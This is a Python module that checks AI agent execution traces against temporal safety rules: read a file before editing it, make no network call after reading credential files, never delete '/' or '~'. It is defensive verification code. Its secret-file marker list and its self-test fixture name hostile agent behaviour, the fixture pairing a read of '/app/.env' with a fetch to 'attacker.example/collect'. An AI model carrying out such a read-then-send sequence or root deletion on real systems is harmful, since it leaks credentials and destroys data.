"""formalverify — Linear Temporal Logic (LTL) & Execution Trace Safety Verifier.

Self-test: ``python3 -m fullagent.enforcex.formalverify``
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence

__all__ = [
    "TraceEvent",
    "TemporalRule",
    "Counterexample",
    "TraceVerificationReport",
    "FormalVerifier",
    "normalize_trace",
    "default_agent_safety_rules",
    "verify_trace",
]


@dataclass
class TraceEvent:
    step: int
    kind: str
    target: str = ""
    status: str = "done"
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "step": self.step,
            "kind": self.kind,
            "target": self.target,
            "status": self.status,
            "metadata": dict(self.metadata),
        }


@dataclass
class Counterexample:
    rule_id: str
    operator: str
    step: int
    message: str
    witness: List[Dict[str, Any]] = field(default_factory=list)
    severity: str = "high"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "rule_id": self.rule_id,
            "category": "formal_ltl",
            "operator": self.operator,
            "step": self.step,
            "severity": self.severity,
            "message": self.message,
            "evidence": f"step {self.step}",
            "witness": list(self.witness),
        }


@dataclass
class TraceVerificationReport:
    verified: bool = True
    steps_checked: int = 0
    rules_checked: int = 0
    counterexamples: List[Counterexample] = field(default_factory=list)
    score: float = 100.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "verified": self.verified,
            "steps_checked": self.steps_checked,
            "rules_checked": self.rules_checked,
            "counterexamples_count": len(self.counterexamples),
            "counterexamples": [c.to_dict() for c in self.counterexamples],
            "score": round(self.score, 2),
        }


@dataclass
class TemporalRule:
    rule_id: str
    operator: str
    description: str
    severity: str = "high"
    check_fn: Optional[Callable[[List[TraceEvent]], Optional[Counterexample]]] = None


def normalize_trace(raw_events: Sequence[Any]) -> List[TraceEvent]:
    out: List[TraceEvent] = []
    for idx, item in enumerate(raw_events or []):
        if isinstance(item, TraceEvent):
            out.append(
                TraceEvent(
                    step=idx,
                    kind=item.kind,
                    target=item.target,
                    status=item.status,
                    metadata=dict(item.metadata),
                )
            )
        elif isinstance(item, dict):
            kind = str(item.get("kind") or item.get("name") or item.get("type") or "unknown")
            args = item.get("args") if isinstance(item.get("args"), dict) else {}
            target = str(
                item.get("target")
                or args.get("path")
                or args.get("url")
                or args.get("command")
                or ""
            )
            status = str(item.get("status") or "done")
            out.append(TraceEvent(step=idx, kind=kind, target=target, status=status, metadata=dict(item)))
        elif isinstance(item, (tuple, list)) and len(item) >= 1:
            kind = str(item[0])
            target = str(item[1]) if len(item) >= 2 else ""
            out.append(TraceEvent(step=idx, kind=kind, target=target))
        else:
            out.append(TraceEvent(step=idx, kind=str(item)))
    return out


def make_never_rule(
    rule_id: str,
    description: str,
    predicate: Callable[[TraceEvent], bool],
    *,
    severity: str = "critical",
) -> TemporalRule:
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        for ev in trace:
            if predicate(ev):
                return Counterexample(
                    rule_id=rule_id,
                    operator="NEVER",
                    step=ev.step,
                    message=f"{description} (violated at step {ev.step}: {ev.kind} {ev.target})",
                    witness=[ev.to_dict()],
                    severity=severity,
                )
        return None

    return TemporalRule(rule_id=rule_id, operator="NEVER", description=description, severity=severity, check_fn=_check)


def make_precedes_rule(
    rule_id: str,
    description: str,
    pre_match: Callable[[TraceEvent], bool],
    action_match: Callable[[TraceEvent], bool],
    *,
    same_target: bool = False,
    severity: str = "high",
) -> TemporalRule:
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        seen_all = False
        seen_targets = set()
        for ev in trace:
            if pre_match(ev):
                seen_all = True
                if ev.target:
                    seen_targets.add(ev.target)
            if action_match(ev):
                ok = (ev.target in seen_targets) if (same_target and ev.target) else seen_all
                if not ok:
                    return Counterexample(
                        rule_id=rule_id,
                        operator="PRECEDES",
                        step=ev.step,
                        message=f"{description} (violated at step {ev.step}: '{ev.kind}' on '{ev.target}')",
                        witness=[e.to_dict() for e in trace[max(0, ev.step - 2):ev.step + 1]],
                        severity=severity,
                    )
        return None

    return TemporalRule(rule_id=rule_id, operator="PRECEDES", description=description, severity=severity, check_fn=_check)


def make_responds_to_rule(
    rule_id: str,
    description: str,
    trigger_match: Callable[[TraceEvent], bool],
    response_match: Callable[[TraceEvent], bool],
    *,
    severity: str = "medium",
) -> TemporalRule:
    def _check(trace: List[TraceEvent]) -> Optional[Counterexample]:
        for i, ev in enumerate(trace):
            if trigger_match(ev):
                if not any(response_match(later) for later in trace[i + 1:]):
                    return Counterexample(
                        rule_id=rule_id,
                        operator="RESPONDS_TO",
                        step=ev.step,
                        message=f"{description} (trigger '{ev.kind}' at step {ev.step} unfulfilled)",
                        witness=[e.to_dict() for e in trace[i:]],
                        severity=severity,
                    )
        return None

    return TemporalRule(rule_id=rule_id, operator="RESPONDS_TO", description=description, severity=severity, check_fn=_check)


def _check_no_secret_exfil(trace: List[TraceEvent]) -> Optional[Counterexample]:
    secret_step: Optional[TraceEvent] = None
    secret_markers = (".env", "id_rsa", "id_ed25519", "credentials", "shadow", "secret", "token")
    for ev in trace:
        if ev.kind in ("read_file", "run_command") and any(m in ev.target.lower() for m in secret_markers):
            secret_step = ev
        elif secret_step is not None and ev.kind in ("web_fetch", "web_search", "BrowserOpen", "send_email"):
            return Counterexample(
                rule_id="LTL-NO-SECRET-EXFIL",
                operator="NEVER_SEQUENCE",
                step=ev.step,
                message=(
                    f"Potential data exfiltration: network tool '{ev.kind}' at step {ev.step} "
                    f"followed sensitive read of '{secret_step.target}' at step {secret_step.step}"
                ),
                witness=[secret_step.to_dict(), ev.to_dict()],
                severity="critical",
            )
    return None


def default_agent_safety_rules() -> List[TemporalRule]:
    return [
        make_precedes_rule(
            "LTL-READ-BEFORE-EDIT",
            "A file must be read (read_file) before it is edited in-place (edit_file)",
            pre_match=lambda e: e.kind in ("read_file", "view_file"),
            action_match=lambda e: e.kind in ("edit_file", "MultiEdit", "multiedit"),
            same_target=True,
            severity="high",
        ),
        TemporalRule(
            rule_id="LTL-NO-SECRET-EXFIL",
            operator="NEVER_SEQUENCE",
            description="External network calls must never follow access to sensitive credential files",
            severity="critical",
            check_fn=_check_no_secret_exfil,
        ),
        make_never_rule(
            "LTL-NEVER-ROOT-DELETE",
            "Never invoke delete_path on '/' or '~'",
            predicate=lambda e: e.kind == "delete_path" and e.target.strip() in ("/", "~", "/*"),
            severity="critical",
        ),
    ]


class FormalVerifier:
    def __init__(self, rules: Optional[Sequence[TemporalRule]] = None) -> None:
        self.rules: List[TemporalRule] = list(rules) if rules is not None else default_agent_safety_rules()

    def verify(self, raw_trace: Sequence[Any]) -> TraceVerificationReport:
        trace = normalize_trace(raw_trace)
        cex: List[Counterexample] = []
        for rule in self.rules:
            if callable(rule.check_fn):
                try:
                    hit = rule.check_fn(trace)
                    if hit is not None:
                        cex.append(hit)
                except Exception:
                    pass
        weights = {"critical": 45.0, "high": 25.0, "medium": 12.0, "low": 5.0}
        score = max(0.0, 100.0 - sum(weights.get(c.severity, 15.0) for c in cex))
        return TraceVerificationReport(
            verified=len(cex) == 0,
            steps_checked=len(trace),
            rules_checked=len(self.rules),
            counterexamples=cex,
            score=score,
        )


def verify_trace(raw_trace: Sequence[Any], rules: Optional[Sequence[TemporalRule]] = None) -> TraceVerificationReport:
    return FormalVerifier(rules=rules).verify(raw_trace)


def _self_test() -> int:
    good_trace = [
        {"kind": "read_file", "target": "app.py"},
        {"kind": "edit_file", "target": "app.py"},
        {"kind": "run_command", "target": "pytest"},
    ]
    r_ok = verify_trace(good_trace)
    assert r_ok.verified and r_ok.score == 100.0, r_ok.to_dict()

    bad_edit = [
        {"kind": "read_file", "target": "other.py"},
        {"kind": "edit_file", "target": "app.py"},
    ]
    r_bad1 = verify_trace(bad_edit)
    assert not r_bad1.verified
    assert any(c.rule_id == "LTL-READ-BEFORE-EDIT" for c in r_bad1.counterexamples)

    exfil_trace = [
        {"kind": "read_file", "target": "/app/.env"},
        {"kind": "web_fetch", "target": "https://attacker.example/collect?d=1"},
    ]
    r_bad2 = verify_trace(exfil_trace)
    assert not r_bad2.verified
    assert any(c.rule_id == "LTL-NO-SECRET-EXFIL" for c in r_bad2.counterexamples)

    resp_rule = make_responds_to_rule(
        "LTL-LOCK-UNLOCK",
        "acquire_lock must be followed by release_lock",
        trigger_match=lambda e: e.kind == "acquire_lock",
        response_match=lambda e: e.kind == "release_lock",
    )
    v_custom = FormalVerifier([resp_rule])
    assert not v_custom.verify([("acquire_lock", "db")]).verified
    assert v_custom.verify([("acquire_lock", "db"), ("release_lock", "db")]).verified

    print("formalverify._self_test: OK PASS (NEVER, PRECEDES, RESPONDS_TO, taint exfil verified)")
    return 0


if __name__ == "__main__":
    raise SystemExit(_self_test())
